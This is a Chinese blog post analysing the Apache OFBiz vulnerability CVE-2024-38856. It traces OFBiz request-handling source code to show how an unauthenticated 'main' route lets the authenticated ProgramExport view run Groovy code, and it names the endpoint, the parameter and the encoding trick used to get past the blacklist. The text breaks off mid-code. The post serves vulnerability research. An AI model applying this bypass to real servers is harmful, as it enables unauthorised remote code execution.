<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CVE-2024-38856 Apache OFBiz18.12.15 任意代码执行漏洞分析 | stoocea's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('/img/pc-bg.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: '确认'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CVE-2024-38856 Apache OFBiz18.12.15 任意代码执行漏洞分析</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-08-18T06:45:00.000Z" id="date"> 2024-08-18</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-08-18T06:48:32.699Z" id="updated"> 2024-08-18</time></div></span></div></div><hr><div id="post-content"><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>这里我选择的版本是12.8.10版本，也是上一个Groovy表达式注入修复的版本</p>
<p><a target="_blank" rel="noopener" href="https://www.oscs1024.com/hd/MPS-7q8o-01rs">https://www.oscs1024.com/hd/MPS-7q8o-01rs</a></p>
<p>从漏洞描述中挑选出几个关键的点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">ProgramExport 和 EntitySQLProcessor 模块未对用户身份进行校验<br>将 payload 通过 base64 和 unicode 编码后绕过 SecuredUpload.isValidText 黑名单校验<br>通过 /webtools/control/main/ProgramExport 接口传入 groovyProgram 参数远程执行任意系统命令<br></code></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h1><h2 id="ControllerServlet"><a href="#ControllerServlet" class="headerlink" title="ControllerServlet"></a>ControllerServlet</h2><p>ofbiz中对于每一次请求的处理都是由一个总的Servlet来进行分发和处理请求的，定位到每一个具有web功能的模块，然后观察它的web.xml配置就能够找到这个servlet</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Main Control Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>ControlServlet<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ControlServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>具体的内容跟平常的servlet一样，具有doPost和doGet方法用来处理请求，只不过这里POST请求统一封装到了doGet方法中</p>
<p>​<img src="/img/ofbizs1/image-20240818143025-thnvmm8.png" alt="image">​</p>
<p>这里的内容其实没什么好讲的，只需注意对RequestHandler的初始化时，将我们此时请求的路由所对应的controllerxml文件已经封装好了就行。然后验一下每次请求共同的常规设置，针对每一次特定的请求处理还是往下看RequestHandler的内容.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">errorPage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>     <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">// the ServerHitBin call for the event is done inside the doRequest method</span><br>         handler.doRequest(request, response, <span class="hljs-literal">null</span>, userLogin, delegator);<br>     &#125; <span class="hljs-keyword">catch</span> (MethodNotAllowedException e) &#123;<br>         response.setContentType(<span class="hljs-string">&quot;text/plain&quot;</span>);<br>         response.setCharacterEncoding(request.getCharacterEncoding());<br>         response.setStatus(HttpServletResponse.SC_METHOD_NOT_ALLOWED);<br>         response.getWriter().print(e.getMessage());<br>         Debug.logError(e.getMessage(), <span class="hljs-keyword">module</span>);<br>     &#125;<br></code></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="RequestHandler的具体解析"><a href="#RequestHandler的具体解析" class="headerlink" title="RequestHandler的具体解析"></a>RequestHandler的具体解析</h2><p>由于doRequest方法的内容将近500多行，这里肯定不能一次性理清，下面只列出三个部分的关键性代码：<strong>关于影响到我们的payload流入sink点的几个关键点</strong>，<strong>以及是如何根据路由调用到对应模块的功能的</strong>，<strong>最后是鉴权（这一点不会讲太多，因为该漏洞的利用不需要用到之前几个CVE的鉴权流程）</strong> 。</p>
<p>‍</p>
<p>在doRequest方法的最开始，进行了一次对各模块的controller配置的加载。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            ccfg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ControllerConfig</span>(getControllerConfig());<br>        &#125; <span class="hljs-keyword">catch</span> (WebAppConfigurationException e) &#123;<br>            Debug.logError(e, <span class="hljs-string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="hljs-keyword">module</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHandlerException</span>(e);<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>具体的getControllerConfig如下，此时的<code>controllerConfigURL</code>​值为<code>file:/usr/src/apache-ofbiz/framework/webtools/webapp/webtools/WEB-INF/controller.xml</code>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ConfigXMLReader.ControllerConfig <span class="hljs-title function_">getControllerConfig</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> ConfigXMLReader.getControllerConfig(<span class="hljs-built_in">this</span>.controllerConfigURL);<br>    &#125; <span class="hljs-keyword">catch</span> (WebAppConfigurationException e) &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> controller.xml errors should throw an exception.</span><br>        Debug.logError(e, <span class="hljs-string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="hljs-keyword">module</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>‍</p>
<p>我们可以定位到webtools的controller.xml内容，代码量有点多，只定位到我们指定的main路由下，这里返回的参数比较重要。一个是security标签，另一个是response标签，返回的内容是success，type为view。这也是我们之后会进入渲染view逻辑的前提。</p>
<p>​<img src="/img/ofbizs1/image-20240815154733-nztavjh.png" alt="image">​</p>
<p>然后在所有的controller.xml文件中，最开头总会include几个用于鉴权的xml内容。在webtools.xml include了这些xml的内容,但是preprocessor的预处理内容只在common-controller中定义了</p>
<p>​<img src="/img/ofbizs1/image-20240815165915-1i2dzux.png" alt="image">​</p>
<p>总计7个要预处理的event，在之后的会有一段for循环将这些event全部遍历一遍进行pre预处理，主要是影响到常规安全检测的过程，不是最主要的。</p>
<p>​<img src="/img/ofbizs1/image-20240815192756-por20io.png" alt="image">​</p>
<p>‍</p>
<h3 id="关键性参数获取"><a href="#关键性参数获取" class="headerlink" title="关键性参数获取"></a>关键性参数获取</h3><p>获取完ControllerConfig之后，开始对URL进行分部解析，这里主要是获取到<code>&quot;webtools&quot;</code>​，<code>&quot;main&quot;</code>​,<code>&quot;ProgramExport&quot;</code>​这三个部分，用来定位到具体的模块和具体的路由功能</p>
<p>细看一下代码中如何根据我们的路由定位到webtools模块的。</p>
<p>通过调用UtilHtpp.getApplicationName方法，截取URL中的第一位数据，截取的规则是<code>/</code>​符号分割。requestUri是截取<code>/</code>​之后的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">cname</span> <span class="hljs-operator">=</span> UtilHttp.getApplicationName(request);  <span class="hljs-comment">//cname=&quot;webtools&quot;</span><br><span class="hljs-type">String</span> <span class="hljs-variable">defaultRequestUri</span> <span class="hljs-operator">=</span> RequestHandler.getRequestUri(request.getPathInfo());<br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getPathInfo(); <span class="hljs-comment">//path=&quot;/main/ProgramExport&quot;</span><br><span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> getRequestUri(path); <span class="hljs-comment">//requesturi=&quot;main&quot;</span><br><span class="hljs-type">String</span> <span class="hljs-variable">overrideViewUri</span> <span class="hljs-operator">=</span> getOverrideViewUri(path); <span class="hljs-comment">//overrideViewUri=&quot;ProgramExport&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getApplicationName</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">appName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>        <span class="hljs-keyword">if</span> (request.getContextPath().length() &gt; <span class="hljs-number">1</span>) &#123;<br>            appName = request.getContextPath().substring(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-comment">// When you set a mountpoint which contains a slash inside its name (ie not only a slash as a trailer, which is possible),</span><br>        <span class="hljs-comment">// as it&#x27;s needed with OFBIZ-10765, OFBiz tries to create a cookie with a slash in its name and that&#x27;s impossible.</span><br>        <span class="hljs-keyword">return</span> appName.replaceAll(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>之后根据ControllerConfig以及request封装一个RequestMaps,整个Maps其实就是webtools Controllerxml中的所有路由标签键值对，然后根据我们当次请求的requestUri(也就是”main”)进行匹配，所获取到的包含当前请求requesturi对应的路由标签requestMap。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);<br><br>......<br><br><span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br>        <span class="hljs-type">RequestMap</span> <span class="hljs-variable">requestMap</span> <span class="hljs-operator">=</span> resolveMethod(method, rmaps).orElseThrow(() -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> UtilProperties.getMessage(<span class="hljs-string">&quot;WebappUiLabels&quot;</span>, <span class="hljs-string">&quot;RequestMethodNotMatchConfig&quot;</span>,<br>                    UtilMisc.toList(requestUri, method), UtilHttp.getLocale(request));<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodNotAllowedException</span>(msg);<br>        &#125;);<br><br><span class="hljs-comment">//最终获取到的map内容如下：</span><br>    &lt;request-map uri=<span class="hljs-string">&quot;main&quot;</span>&gt;<br>        &lt;security https=<span class="hljs-string">&quot;true&quot;</span> auth=<span class="hljs-string">&quot;false&quot;</span>/&gt; <span class="hljs-comment">//注意这里不需要auth，表明该功能不需要鉴权。</span><br>        &lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;main&quot;</span>/&gt;<br>    &lt;/request-map&gt;<br></code></pre></td></tr></table></figure>

<p>继续往下走是判断我们是否为chain请求，这里其实不用管，我们进入RequestHandler的时候chain选项就是false，所以不会进入if (chain)的内容，但是其else内容还是要进的。这里的else内容就是我们上面留下的那7个pre Event的执行了，循环遍历,并且一一invoke到具体的代码逻辑，整体对我们漏洞执行无影响，大概就是一些常规的该项目自带的安全前置检测，JWT校验等等</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (ConfigXMLReader.Event event: ccfg.getPreprocessorEventList().values()) &#123;  <span class="hljs-comment">//ControllerConfig中的ProcessorEvent的是很多的，但是pre只有那么几个</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">returnString</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.runEvent(request, response, event, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;preprocessor&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (returnString == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;none&quot;</span>.equalsIgnoreCase(returnString)) &#123;<br>                        interruptRequest = <span class="hljs-literal">true</span>;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;success&quot;</span>.equalsIgnoreCase(returnString)) &#123;<br>                        <span class="hljs-keyword">if</span> (!returnString.contains(<span class="hljs-string">&quot;:_protect_:&quot;</span>)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandlerException</span>(<span class="hljs-string">&quot;Pre-Processor event [&quot;</span> + event.invoke + <span class="hljs-string">&quot;] did not return &#x27;success&#x27;.&quot;</span>);<br>                        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// protect the view normally rendered and redirect to error response view</span><br>                            returnString = returnString.replace(<span class="hljs-string">&quot;:_protect_:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                            <span class="hljs-keyword">if</span> (returnString.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                                request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, returnString);<br>                            &#125;<br>                            eventReturn = <span class="hljs-literal">null</span>;<br>                            <span class="hljs-comment">// check to see if there is a &quot;protect&quot; response, if so it&#x27;s ok else show the default_error_response_view</span><br>                            <span class="hljs-keyword">if</span> (!requestMap.requestResponseMap.containsKey(<span class="hljs-string">&quot;protect&quot;</span>)) &#123;<br>                                <span class="hljs-keyword">if</span> (ccfg.getProtectView() != <span class="hljs-literal">null</span>) &#123;<br>                                    overrideViewUri = ccfg.getProtectView();<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    overrideViewUri = EntityUtilProperties.getPropertyValue(<span class="hljs-string">&quot;security&quot;</span>, <span class="hljs-string">&quot;default.error.response.view&quot;</span>, delegator);<br>                                    overrideViewUri = overrideViewUri.replace(<span class="hljs-string">&quot;view:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                                    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;none:&quot;</span>.equals(overrideViewUri)) &#123;<br>                                        interruptRequest = <span class="hljs-literal">true</span>;<br>                                    &#125;<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (EventHandlerException e) &#123;<br>                    Debug.logError(e, <span class="hljs-keyword">module</span>);<br>                &#125;<br></code></pre></td></tr></table></figure>

<p>‍</p>
<h3 id="鉴权绕过分析"><a href="#鉴权绕过分析" class="headerlink" title="鉴权绕过分析"></a>鉴权绕过分析</h3><p>过完这段else里面的大for之后，比较关键的鉴权逻辑如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//      </span><br><span class="hljs-keyword">if</span> (requestMap.securityAuth) &#123;<br>....<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>....<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里为什么我折叠了起来呢？不知道是否还记得最开始获取requestMap的时候，我们定位到了main的键值对标签，其中 <security>标签中auth的值为false，对应的就是此时<code>requestMap.securityAuth</code>​为false，也就是我们当前webtools&#x2F;main这个路由是不需要鉴权的，直接润。但是我们最终利用的是<code>ProgramExport</code>​路由的渲染功能，查看一下<code>ProgramExport</code>​在webtools的xml中是如何定义的</security></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;request-map uri=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;<br>        &lt;security https=<span class="hljs-string">&quot;true&quot;</span> auth=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;error&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;<br>    &lt;/request-map&gt;<br></code></pre></td></tr></table></figure>

<p> 可以看到ProgramExport本身是需要鉴权的，也就是auth&#x3D;true。那为什么<code>requestMap.securityAuth</code>​的结果是main路由下的false呢？回到requestMap的获取过程</p>
<p>requestMap是通过requestMaps获取到的,跟进一下requetMaps构造的具体逻辑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);<br></code></pre></td></tr></table></figure>

<p>​<img src="/img/ofbizs1/image-20240816100055-jf8ecrq.png" alt="image">​</p>
<p>这里最关键的判断是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (requestMapMap.containsKey(requestUri)<br>               <span class="hljs-comment">// Ensure that overridden view exists.</span><br>               &amp;&amp; (viewUri == <span class="hljs-literal">null</span> || viewMapMap.containsKey(viewUri) <br>               || (<span class="hljs-string">&quot;SOAPService&quot;</span>.equals(requestUri) &amp;&amp; <span class="hljs-string">&quot;wsdl&quot;</span>.equalsIgnoreCase(req.getQueryString()))))<br></code></pre></td></tr></table></figure>

<p>requestMapMap封装的是webtools的controllerxml文件中所有的路由映射，这里我们肯定能够匹配到<code>main</code>​下的路由映射。之后试图映射viewMapMap也肯定能够匹配到<code>ProgramExport</code>​。所以这里的if判断肯定是能过的，过了之后就执行了下面的requestMaps的获取,他这里仅仅只是获取路由映射作为requestMaps的结果，这里是很正常的思路，但是到了之后的response返回时，却采取的是viewUri视图映射的逻辑了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">rmaps = requestMapMap.get(requestUri);<br></code></pre></td></tr></table></figure>

<p>补充了一些鉴权的前置部分，继续往下走逻辑的话，是关于当前requestMap，也就是main路由下的配置检查，如果存在event，则需要定位到相关的event对应类和方法，并且执行逻辑。执行完之后要封装eventReturnResponse。但是main路由下是没有event的，所以这些逻辑是不用走的。</p>
<p>‍</p>
<h3 id="结果渲染"><a href="#结果渲染" class="headerlink" title="结果渲染"></a>结果渲染</h3><p>最后就是将repsonse和其他结果进行渲染返回了。不过还是要判断一下当前request(main路由)的response类型，再做具体的执行逻辑。在main路由中对应的response类型是view</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;main&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">    <br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;url&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>               <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a URL redirect.&quot;</span> + showSessionId(request), <span class="hljs-keyword">module</span>);<br>               callRedirect(nextRequestResponse.value, response, request, ccfg.getStatusCodeString());<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;url-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>               <span class="hljs-comment">// check for a cross-application redirect</span><br>               <span class="hljs-keyword">if</span> (Debug.verboseOn())<br>                   Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a URL redirect with redirect parameters.&quot;</span><br>                           + showSessionId(request), <span class="hljs-keyword">module</span>);<br>               callRedirect(nextRequestResponse.value + <span class="hljs-built_in">this</span>.makeQueryString(request, nextRequestResponse), response,<br>                       request, ccfg.getStatusCodeString());<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;cross-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>               <span class="hljs-comment">// check for a cross-application redirect</span><br>               <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a Cross-Application redirect.&quot;</span> + showSessionId(request), <span class="hljs-keyword">module</span>);<br>               <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> nextRequestResponse.value.startsWith(<span class="hljs-string">&quot;/&quot;</span>) ? nextRequestResponse.value : <span class="hljs-string">&quot;/&quot;</span> + nextRequestResponse.value;<br>               callRedirect(url + <span class="hljs-built_in">this</span>.makeQueryString(request, nextRequestResponse), response, request, ccfg.getStatusCodeString());<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;request-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>               <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a Request redirect.&quot;</span> + showSessionId(request), <span class="hljs-keyword">module</span>);<br>               callRedirect(makeLinkWithQueryString(request, response, <span class="hljs-string">&quot;/&quot;</span> + nextRequestResponse.value, nextRequestResponse), response, request, ccfg.getStatusCodeString());<br>         